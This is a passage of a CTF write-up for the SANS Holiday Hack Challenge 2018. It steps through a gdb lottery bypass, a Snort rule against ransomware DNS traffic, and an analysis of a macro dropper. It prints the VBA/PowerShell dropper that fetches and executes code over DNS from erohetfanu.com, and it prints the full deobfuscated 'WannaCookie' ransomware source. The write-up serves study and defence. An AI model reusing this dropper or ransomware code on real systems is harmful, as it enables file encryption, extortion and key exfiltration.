       0x0000000000001542 <+120>:   imul   $0x2710,%eax,%eax
       0x0000000000001548 <+126>:   sub    %eax,%ecx
       0x000000000000154a <+128>:   mov    %ecx,%eax
       0x000000000000154c <+130>:   mov    %eax,-0x4(%rbp)
       0x000000000000154f <+133>:   lea    0x5856(%rip),%rdi        # 0x6dac
       0x0000000000001556 <+140>:   mov    $0x0,%eax
       0x000000000000155b <+145>:   callq  0x8f0 <printf@plt>
       0x0000000000001560 <+150>:   mov    -0x4(%rbp),%eax
       0x0000000000001563 <+153>:   mov    %eax,%esi
       0x0000000000001565 <+155>:   lea    0x5858(%rip),%rdi        # 0x6dc4
       0x000000000000156c <+162>:   mov    $0x0,%eax
       0x0000000000001571 <+167>:   callq  0x8f0 <printf@plt>
       0x0000000000001576 <+172>:   lea    0x584a(%rip),%rdi        # 0x6dc7
       0x000000000000157d <+179>:   callq  0x910 <puts@plt>
       0x0000000000001582 <+184>:   cmpl   $0x4c9,-0x4(%rbp)
       0x0000000000001589 <+191>:   jne    0x1597 <main+205>
       0x000000000000158b <+193>:   mov    $0x0,%eax
       0x0000000000001590 <+198>:   callq  0xfd7 <winnerwinner>
       0x0000000000001595 <+203>:   jmp    0x15a1 <main+215>
       0x0000000000001597 <+205>:   mov    $0x0,%eax
       0x000000000000159c <+210>:   callq  0x14b7 <sorry>
       0x00000000000015a1 <+215>:   mov    $0x0,%edi
       0x00000000000015a6 <+220>:   callq  0x920 <exit@plt>
    End of assembler dump.

At the highlighted line, we can see that the value of :code:`$rbp - 0x4` is
compared to 0x4c9. This hex value in decimal is 1225, which is the winning
value of the lottery. So this is the comparison that is made between the
winning ticket and our randomly drawn ticket. If they're different, the
program jumps to :code:`main+205` and calls the function :code:`sorry`. If
they're equal, it continues and calls :code:`winnerwinner`.

Let's put a breakpoint on this comparison, and run the program:

.. code-block:: console

    (gdb) b *(main+184)
    Breakpoint 1 at 0x1582
    (gdb) run
    Starting program: /home/elf/sleighbell-lotto 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    The winning ticket is number 1225.
    Rolling the tumblers to see what number you'll draw...

    You drew ticket number 8093!


    Breakpoint 1, 0x0000555555555582 in main ()

Now, we're just before the comparison of our (losing) ticket to 1225. Several
options are available. We can directly jump to the call of
:code:`winnerwinner`:

.. code-block:: console

    (gdb) j *(main+198)
    Continuing at 0x555555555590.
    [snip]
    Congratulations! You've won, and have successfully completed this challenge.
    [Inferior 1 (process 46) exited normally]

We can also directly modify the memory, so that our ticket has the winning
value:

.. code-block:: console

    (gdb) x/d ($rbp-0x4)
    0x7fffffffe5fc: 8093
    (gdb) set *((int *) ($rbp-0x4)) = 1225
    (gdb) continue
    Continuing.
    [snip]
    Congratulations! You've won, and have successfully completed this challenge.
    [Inferior 1 (process 40) exited normally]

I'm sure there are many more ways to win this lottery, and look forward to read
about them in other write-ups!

Snort Rule
----------

In Santa's secret room, we find Alabaster, who is in need of help:

.. image:: /images/sans-christmas-challenge-2018/alabaster.png
    :alt: alabaster.png
    :align: center

*Alabaster says*

    Help, all of our computers have been encrypted by ransomware!

    I came here to help but got locked in 'cause I dropped my "Alabaster
    Snowball" badge in a rush.

    I started analyzing the ransomware on my host operating system, ran it by
    accident, and now my files are encrypted!

    Unfortunately, the password database I keep on my computer was encrypted,
    so now I don't have access to any of our systems.

    If only there were some way I could create some kind of traffic filter that
    could alert anytime ransomware was found!

So, we must stop the ransomware traffic, using the Snort terminal:

.. code-block:: console

      _  __     _             _       _____          _   _      
     | |/ /    (_)           | |     / ____|        | | | |     
     | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
     |  < | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
     | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
     |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
                 / ____| __/ |          | |                     
                | (___  |___/  ___  _ __| |_                    
                 \___ \| '_ \ / _ \| '__| __|                   
                 ____) | | | | (_) | |  | |_                    
                |_____/|_|_|_|\___/|_|_  \__|                   
                   |_   _|  __ \ / ____|                        
                     | | | |  | | (___                          
             _____   | | | |  | |\___ \        __               
            / ____| _| |_| |__| |____) |      /_ |              
           | (___  |_____|_____/|_____/ _ __   | |              
            \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |              
            ____) |  __/ | | \__ \ (_) | |     | |              
           |_____/ \___|_| |_|___/\___/|_|     |_|              
    ============================================================
    INTRO:
      Kringle Castle is currently under attacked by new piece of
      ransomware that is encrypting all the elves files. Your 
      job is to configure snort to alert on ONLY the bad 
      ransomware traffic.
    GOAL:
      Create a snort rule that will alert ONLY on bad ransomware
      traffic by adding it to snorts /etc/snort/rules/local.rules
      file. DNS traffic is constantly updated to snort.log.pcap
    COMPLETION:
      Successfully create a snort rule that matches ONLY
      bad DNS traffic and NOT legitimate user traffic and the 
      system will notify you of your success.
      
      Check out ~/more_info.txt for additional information.
    elf@4a4351a6045e:~$ cat more_info.txt 
    MORE INFO:
      A full capture of DNS traffic for the last 30 seconds is 
      constantly updated to:
      /home/elf/snort.log.pcap
      You can also test your snort rule by running:
      snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf
      This will create an alert file at ~/snort_logs/alert
      This sensor also hosts an nginx web server to access the 
      last 5 minutes worth of pcaps for offline analysis. These 
      can be viewed by logging into:
      http://snortsensor1.kringlecastle.com/
      Using the credentials:
      ----------------------
      Username | elf
      Password | onashelf
      tshark and tcpdump have also been provided on this sensor.
    HINT: 
      Malware authors often user dynamic domain names and 
      IP addresses that change frequently within minutes or even 
      seconds to make detecting and block malware more difficult.
      As such, its a good idea to analyze traffic to find patterns
      and match upon these patterns instead of just IP/domains.

We must create a rule that will match all the ransomware's traffic, and won't
match the legitimate users' traffic. We're given access to a website which
contains PCAP files with the DNS traffic of the last five minutes.

Let's download some of these PCAP files and see if we can find a common
pattern.  You can use KringleCastle's website, mentioned herebefore, or you can
download some of the PCAP files I had during the challenge:

* `snort.log.1546631032.853224.pcap </docs/sans-christmas-challenge-2018/snort.log.1546631032.853224.pcap>`__
* `snort.log.1546631066.7843747.pcap </docs/sans-christmas-challenge-2018/snort.log.1546631066.7843747.pcap>`__
* `snort.log.1546631107.349513.pcap </docs/sans-christmas-challenge-2018/snort.log.1546631107.349513.pcap>`__

If we open these PCAP files, we see exclusively TXT DNS traffic. However, you
notice rapidly that some of these domains don't seem legitimate. Some of the
requests made interrogate a weird looking domain, with some sort of hash as a
part of the subdomain, and the TXT answers are extremely long. This is clearly
very fishy, and we can easily guess that this is our ransomware traffic.

However, we can't use the source IP address, the destination IP address, or the
domain name as `IOCs <https://en.wikipedia.org/wiki/Indicator_of_compromise>`__,
because they never stay the same. The only constant seems to be this hash,
:code:`77616E6E61636F6F6B69652E6D696E2E707331`, which is part of the subdomain.

Let's create a Snort rule that will trigger an alert every time we see this
hash. I used `this website <https://resources.infosecinstitute.com/snort-rules-workshop-part-one/>`__
and StackOverflow to determine how to do so:

.. code-block:: text

    alert udp any any -> any any (msg:"Ransomware trafic detected"; pcre:"/77616E6E61636F6F6B69652E6D696E2E707331/"; metadata:service dns; sid:1337; rev:3;)

Here's what it means:

* :code:`alert`: create an alert when this rule matches
* :code:`udp`: we only care about UDP traffic
* :code:`any any -> any any`: we look at traffic from any source to any
  destination. I tried to do some fine tuning here, but I didn't catch every
  traffic, only the requests made by the ransomware (and not the answers from
  the server). This is likely overkill and wouldn't work in a true production
  environment.
* :code:`msg`: the message that will be displayed in our alert
* :code:`pcre:"/77616E6E61636F6F6B69652E6D696E2E707331/"`: our alert will only
  be triggered if it matches this regex. Here, it's a pretty simple regex that
  only looks if the IOC hash is in the traffic.
* :code:`metadata`: the UDP traffic is DNS
* :code:`sid`, :code:`rev`: id and revision number of the rule

Let's add this rule at the end of our rule file:

.. code-block:: console
    :hl_lines: 3

    elf@7a674ac839a9:~$ echo -e '\nalert udp any any -> any any (msg:"Ransomware trafic detected"; pcre:"/77616E6E61636F6F6B69652E6D696E2E707331/"; metadata:service dns; sid:1337; rev:3;)' >> /etc/snort/rules/local.rules 
    elf@7a674ac839a9:~$ 
    [+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 

Alright, we now have an alert every time the ransomware generates traffic.

Malware Dropper
---------------

Now that the ransomware traffic is stopped, Alabaster gives us an archive,
which, he supposes, is the initial dropper for the ransomware. We must find
the domain it communicates with.

.. image:: /images/sans-christmas-challenge-2018/alabaster.png
    :alt: alabaster.png
    :align: center

*Alabaster says*

    Thank you so much! Snort IDS is alerting on each new ransomware infection
    in our network.

    Hey, you're pretty good at this security stuff. Could you help me further
    with what I suspect is a malicious Word document?

    All the elves were emailed a cookie recipe right before all the infections.
    Take `this document </docs/sans-christmas-challenge-2018/CHOCOLATE_CHIP_COOKIE_RECIPE.zip>`__
    with a password of **elves** and find the domain it communicates with.

So, let's extract this archive:

.. code-block:: console
    :hl_lines: 21

    $ 7z -pelves x CHOCOLATE_CHIP_COOKIE_RECIPE.zip 

    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)

    Scanning the drive for archives:
    1 file, 110699 bytes (109 KiB)

    Extracting archive: CHOCOLATE_CHIP_COOKIE_RECIPE.zip
    --
    Path = CHOCOLATE_CHIP_COOKIE_RECIPE.zip
    Type = zip
    Physical Size = 110699

    Everything is Ok

    Size:       113540
    Compressed: 110699
    $  ls -lh
    total 228K
    -rw-r--r-- 1 useless useless 111K déc.  17 18:46 CHOCOLATE_CHIP_COOKIE_RECIPE.docm
    -rw-r--r-- 1 useless useless 109K déc.  18 04:17 CHOCOLATE_CHIP_COOKIE_RECIPE.zip

Alright, it's a :code:`.docm` file. This is probably a Microsoft Office file
with a malicious macro that will download and execute the malware. Let's open
it **with extra care not to execute the macro**.

For those of you who only want the chocolate chip cookie recipe, you can find
it `in the appendix <#appendix-chocolate-chip-cookie-recipe>`__.

If we take a look at the macros in this Office file, we can see that two
functions, :code:`Document_Open` and :code:`AutoOpen` were created:

.. image:: /images/sans-christmas-challenge-2018/libreoffice_macro_docm.png
    :alt: libreoffice_macro_docm.png
    :align: center

*(Yes, it's LibreOffice, sue me)*

These functions are designed to be executed as soon as the document is open.
Let's take a look at the source code of these functions:

.. code-block:: vba
    :hl_lines: 5

    Rem Attribute VBA_ModuleType=VBAModule
    Option VBASupport 1
    Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
    Shell cmd
    End Sub

As soon as the document gets opened, a (quite ugly) PowerShell command is
executed. We can see from the source code that there is some base64-encoding,
and some compressing. Instead of doing the analysis manually, we'll use
PowerShell to execute the command. **But** in order **not to get infected
ourselves**, we'll replace every occurrence of :code:`IEX` (or
:code:`Invoke-Expression`) by a :code:`Write-Output`. This way, the source
code will be displayed instead of being executed.

So, let's see what this PowerShell gibberish means:

.. code-block:: ps1con

    PS C:\Users\admin> sal a New-Object; Write-Output (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
    function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))

Alright, we get a weird function, :code:`H2A`, which is making DNS request to
a domain name :code:`erohetfanu.com`. That's the domain we're looking for.

Malware Analysis
----------------

Alabaster wonders if the malware uses a killswitch domain, *à la WannaCry*.

.. image:: /images/sans-christmas-challenge-2018/alabaster.png
    :alt: alabaster.png
    :align: center

*Alabaster says*

    Erohetfanu.com, I wonder what that means?

    Unfortunately, Snort alerts show multiple domains, so blocking that one
    won't be effective.

    I remember another ransomware in recent history had a killswitch domain
    that, when registered, would prevent any further infections.

    Perhaps there is a mechanism like that in this ransomware? Do some more
    analysis and see if you can find a fatal flaw and activate it!

Let's analyze the ransomware and see what we can find. First of all, let's
get the source code of the malware. Let's execute the command we found in the
previous question, **without** executing :code:`IEX`:

.. code-block:: ps1con

    PS E:\sans-christmas-challenge-2018> function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($iin 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)){$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; $(H2A $h | Out-string)
    $functions = {function e_d_file($key, $File, $enc_it) {[byte[]]$key = $key;$Suffix = "`.wannacookie";[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');[System.Int32]$KeySize = $key.Length*8;$AESP = New-Object 'System.Security.Cryptography.AesManaged';$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AESP.BlockSize = 128;$AESP.KeySize = $KeySize;$AESP.Key = $key;$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);if ($enc_it) {$DestFile = $File + $Suffix} else {$DestF[snip]

Wow, we get a lot of minified code. Let's make it a little bit more readable.
Here's the full source code of the malware. I just added carriage-returns
after every :code:`}`, :code:`;`, and indented the code:

.. code-block:: powershell

    $functions = {
        function e_d_file($key, $File, $enc_it) {
            [byte[]]$key = $key;
            $Suffix = "`.wannacookie";
            [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
            [System.Int32]$KeySize = $key.Length*8;
            $AESP = New-Object 'System.Security.Cryptography.AesManaged';
            $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
            $AESP.BlockSize = 128;
            $AESP.KeySize = $KeySize;
            $AESP.Key = $key;
            $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
            if ($enc_it) {
                $DestFile = $File + $Suffix
            } else {
                $DestFile = ($File -replace $Suffix)
            };
            $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
            if ($enc_it) {
                $AESP.GenerateIV();
                $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
                $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
                $Transform = $AESP.CreateEncryptor()
            } else {
                [Byte[]]$LenIV = New-Object Byte[] 4;
                $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
                $FileSR.Read($LenIV,  0, 3) | Out-Null;
                [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
                [Byte[]]$IV = New-Object Byte[] $LIV;
                $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
                $FileSR.Read($IV, 0, $LIV) | Out-Null;
                $AESP.IV = $IV;
                $Transform = $AESP.CreateDecryptor()
            };
            $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
            [Int]$Count = 0;
            [Int]$BlockSzBts = $AESP.BlockSize / 8;
            [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
            Do {
                $Count = $FileSR.Read($Data, 0, $BlockSzBts);
                $CryptoS.Write($Data, 0, $Count)
            } While ($Count -gt 0);
            $CryptoS.FlushFinalBlock();
            $CryptoS.Close();
            $FileSR.Close();
            $FileSW.Close();
            Clear-variable -Name "key";
            Remove-Item $File
        }
    };
    function H2B {
        param($HX);
        $HX = $HX -split '(..)' | ? {
            $_ 
        };
        ForEach ($value in $HX){
            [Convert]::ToInt32($value,16)
        }
    };
    function A2H(){
        Param($a);
        $c = '';
        $b = $a.ToCharArray();
        ;
        Foreach ($element in $b) {
            $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
        };
        return $c -replace ' '
    };
    function H2A() {
        Param($a);
        $outa;
        $a -split '(..)' | ? {
            $_ 
        }  | forEach {
            [char]([convert]::toint16($_,16))
        } | forEach {
            $outa = $outa + $_
        };
        return $outa
    };
    function B2H {
        param($DEC);
        $tmp = '';
        ForEach ($value in $DEC){
            $a = "{0:x}" -f [Int]$value;
            if ($a.length -eq 1){
                $tmp += '0' + $a
            } else {
                $tmp += $a
            }
        };
        return $tmp
    };
    function ti_rox {
        param($b1, $b2);
        $b1 = $(H2B $b1);
        $b2 = $(H2B $b2);
        $cont = New-Object Byte[] $b1.count;
        if ($b1.count -eq $b2.count) {
            for($i=0;
                    $i -lt $b1.count ;
                    $i++) {
                $cont[$i] = $b1[$i] -bxor $b2[$i]
            }
        };
        return $cont
    };
    function B2G {
        param([byte[]]$Data);
        Process {
            $out = [System.IO.MemoryStream]::new();
            $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);
            $gStream.Write($Data, 0, $Data.Length);
            $gStream.Close();
            return $out.ToArray()
        }
    };
    function G2B {
        param([byte[]]$Data);
        Process {
            $SrcData = New-Object System.IO.MemoryStream( , $Data );
            $output = New-Object System.IO.MemoryStream;
            $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
            $gStream.CopyTo( $output );
            $gStream.Close();
            $SrcData.Close();
            [byte[]] $byteArr = $output.ToArray();
            return $byteArr
        }
    };
    function sh1([String] $String) {
        $SB = New-Object System.Text.StringBuilder;
        [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
            [Void]$SB.Append($_.ToString("x2"))
        };
        $SB.ToString()
    };
    function p_k_e($key_bytes, [byte[]]$pub_bytes){
        $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
        $cert.Import($pub_bytes);
        $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);
        return $(B2H $encKey)
    };
    function e_n_d {
        param($key, $allfiles, $make_cookie );
        $tcount = 12;
        for ( $file=0;
                $file -lt $allfiles.length;
                $file++  ) {
            while ($true) {
                $running = @(Get-Job | Where-Object {
                        $_.State -eq 'Running' 
                        });
                if ($running.Count -le $tcount) {
                    Start-Job  -ScriptBlock {
                        param($key, $File, $true_false);
                        try{
                            e_d_file $key $File $true_false
                        } catch {
                            $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                        }
                    } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
                    break
                } else {
                    Start-Sleep -m 200;
                    continue
                }
            }
        }
    };
    function g_o_dns($f) {
        $h = '';
        foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
            $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
        };
        return (H2A $h)
    };
    function s_2_c($astring, $size=32) {
        $new_arr = @();
        $chunk_index=0;
        foreach($i in 1..$($astring.length / $size)) {
            $new_arr += @($astring.substring($chunk_index,$size));
            $chunk_index += $size
        };
        return $new_arr
    };
    function snd_k($enc_k) {
        $chunks = (s_2_c $enc_k );
        foreach ($j in $chunks) {
            if ($chunks.IndexOf($j) -eq 0) {
                $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
            } else {
                $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
            }
        };
        return $n_c_id
    };
    function wanc {
        $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
        if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
            return
        };
        if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
            return
        };
        $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );
        $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {
                            Get-Random
                            })[0..15] -join ''))  | ? {
                $_ -ne 0x00
                });
        $h_k = $(B2H $b_k);
        $k_h = $(sh1 $h_k);
        $p_k_e_k = (p_k_e $b_k $p_k).ToString();
        $c_id = (snd_k $p_k_e_k);
        $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
        [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where {
                ! $_.PSIsContainer 
                } | Foreach-Object {
                $_.Fullname
                });
        e_n_d $b_k $f_c $true;
        Clear-variable -Name "h_k";
        Clear-variable -Name "b_k";
        $lurl = 'http://127.0.0.1:8080/';
        $html_c = @{
            'GET /'  =  $(g_o_dns (A2H "source.min.html"));
            'GET /close'  =  '<p>Bye!</p>'
        };
        Start-Job -ScriptBlock{
            param($url);
            Start-Sleep 10;
            Add-type -AssemblyName System.Windows.Forms;
            start-process "$url" -WindowStyle Maximized;
            Start-sleep 2;
            [System.Windows.Forms.SendKeys]::SendWait("{F11}")
        } -Arg $lurl;
        $list = New-Object System.Net.HttpListener;
        $list.Prefixes.Add($lurl);
        $list.Start();
        try {
            $close = $false;
            while ($list.IsListening) {
                $context = $list.GetContext();
                $Req = $context.Request;
                $Resp = $context.Response;
                $recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;
                if ($recvd -eq 'GET /') {
                    $html = $html_c[$recvd]
                } elseif ($recvd -eq 'GET /decrypt') {
                    $akey = $Req.QueryString.Item("key");
                    if ($k_h -eq $(sh1 $akey)) {
                        $akey = $(H2B $akey);
                        [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where {
                                ! $_.PSIsContainer 
                                } | Foreach-Object {
                                $_.Fullname
                                });
                        e_n_d $akey $f_c $false;
                        $html = "Files have been decrypted!";
                        $close = $true
                    } else {
                        $html = "Invalid Key!"
                    }
                } elseif ($recvd -eq 'GET /close') {
                    $close = $true;
                    $html = $html_c[$recvd]
                } elseif ($recvd -eq 'GET /cookie_is_paid') {
                    $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
                    if ( $c_n_k.length -eq 32 ) {
                        $html = $c_n_k
                    } else {
                        $html = "UNPAID|$c_id|$d_t"
                    }
                } else {
                    $Resp.statuscode = 404;
                    $html = '<h1>404 Not Found</h1>'
                };
                $buffer = [Text.Encoding]::UTF8.GetBytes($html);
                $Resp.ContentLength64 = $buffer.length;
                $Resp.OutputStream.Write($buffer, 0, $buffer.length);
                $Resp.Close();
                if ($close) {
                    $list.Stop();
                    return
                }
            }
        } finally {
            $list.Stop()
        }
    };
    wanc;

Whew, that's a lot of script. We'll analyze it more deeply in the next
question. The script defines many functions. The main one seems to be
:code:`wanc`, since it's called at the end of the script. Let's take a look at
the beginning of this function:

.. code-block:: powershell
    :hl_lines: 3

    function wanc {
        $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
        if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
            return
        };
        if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
            return
        };
    [snip]

The function begins by making some kind of DNS request. If it resolves, then
it immediatly returns. It also checks if something is listening on
:code:`127.0.0.1:8080` (*i.e.* if the ransomware is already running), and if
the Active Directory domain of the infected machine is :code:`KRINGLECASTLE`:

* The first check (the DNS check) is used to make sure that the ransomware is
  not being ran in a virtual machine. This check is similar to what
  `@MalwareTechBlog <https://twitter.com/MalwareTechBlog>`__ found in the
  WannaCry ransomware.
* The second check (the network check and the Active Directory check) is to
  make sure that the ransomware is running on the intended target, and is not
  being ran more than once.

Similarly to WannaCry, if we register the killswitch domain, then it will
always resolved and the ransomware will stop working. To find the kill switch
domain, let's just execute the PowerShell code used to generate it. To run
this command, the variable :code:`S1` and the functions :code:`H2A`,
:code:`B2H`, :code:`H2B`, :code:`G2B`, and :code:`ti_rox` must be defined:

.. code-block:: ps1con

    PS C:\> $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
    yippeekiyaa.aaay

The killswitch domain seems to be :code:`yippeekiyaa.aaay`. Let's register it
on `HoHoHo Daddy <https://hohohodaddy.kringlecastle.com/index.html>`__:

.. image:: /images/sans-christmas-challenge-2018/hohoho_daddy_success.png
    :alt: hohoho_daddy_success.png
    :align: center

Alright! We stopped the malware. We can now feel like @MalwareTechBlog. You
know, without the federal investigation and stuff... Anyway! The sentence is
:code:`Successfully registered yippeekiyaa.aaay!`.

Memory Dump Analysis
--------------------

Alabaster needs us to decrypt his password database, that was encrypted by the
WannaCookie ransomware.

.. image:: /images/sans-christmas-challenge-2018/alabaster.png
    :alt: alabaster.png
    :align: center

*Alabaster says*

    Yippee-Ki-Yay! Now, I have a ma... kill-switch!

    Now that we don't have to worry about new infections, I could sure use your
    L337 security skills for one last thing.

    As I mentioned, I made the mistake of analyzing the malware on my host
    computer and the ransomware encrypted my password database.

    Take this `zip <https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip>`__
    with a memory dump and my encrypted password database, and see if you can
    recover my passwords.

    One of the passwords will unlock our access to the vault so we can get in
    before the hackers.

Alright, a lot is happening. Here's what we can see from the source code:

* The function :code:`e_d_file` takes a key, a file, and a boolean. If the
  boolean is true, the file is encrypted using AES in CBC mode. If the boolean
  is false, the file is decrypted using the same algorithm.
* Some helper functions are defined:
    * :code:`H2B`, :code:`B2H`: convert data from/to hexadecimal strings
      to/from binary objects.
    * :code:`H2A`, :code:`A2H`: convert data from/to hexadecimal strings
      to/from byte arrays.
    * :code:`G2B`, :code:`B2G`: convert data from/to compressed data to/from
      binary objects.
* The function :code:`ti_rox` seems to XOR two variables.
* The function :code:`sh1` is just a wrapper to the SHA1 hashing function.
* The function :code:`p_k_e` encrypts a variable using a public key.
* The function :code:`e_n_d` encrypts/decrypts a list of files using an AES
  key (by calling the :code:`e_d_file` function).
* The function :code:`g_o_dns` seems to recover some data from the
  :code:`erohetfanu.com` DNS server.
* The function :code:`s_2_c` splits a string into chunks.
* The function :code:`snd_k` sends, chunk by chunk, a string to the
  :code:`erohetfanu.com` DNS server.
* Finally, the function :code:`wanc` is the main function.

Let's analyze how the malware works, so that we can find a way to decrypt
Alabaster's passwords. Here's what :code:`wanc` does:

* It first checks the killswitch domain, whether the malware is already
  running, and if it's running on the intended target.
* It then recovers what seems to be a public key, :code:`$p_k`, from the DNS
  server, with the following command: :code:`g_o_dns("7365727665722E637274")`.
* It then generates an AES key, :code:`$b_k`, using two arrays of bytes from
  1 to 255 (no zero), and the function :code:`Get-Random`.
